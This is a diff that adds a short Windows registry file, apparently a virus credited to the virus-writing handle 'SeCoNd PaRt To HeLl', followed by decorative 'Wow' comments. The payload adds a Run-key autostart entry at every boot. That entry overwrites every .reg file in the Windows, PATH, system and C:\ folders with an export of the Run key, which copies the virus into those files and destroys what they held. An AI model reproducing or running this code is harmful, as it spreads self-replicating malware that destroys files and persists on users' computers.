@@ -1,0 +1,24 @@
+REGEDIT 4
+
+;; WinREG.Wow
+;; written by SeCoNd PaRt To HeLl
+;; for my Virus Database
+
+[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\]
+@="command /c for %q in (%windir%\*.reg %path%\*.reg C:\*.reg %windir%\system\*.reg) do regedit /e %q HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"
+
+;; Wow
+;; WowWow
+;; WowWowWow
+;; WowWowWowWow
+;; WowWowWowWowWow
+;; WowWowWowWowWowWow
+;; WowWowWowWowWowWowWow
+;; WowWowWowWowWowWowWowWow
+;; WowWowWowWowWowWowWow
+;; WowWowWowWowWowWow
+;; WowWowWowWowWow
+;; WowWowWowWow
+;; WowWowWow
+;; WowWow
+;; Wow
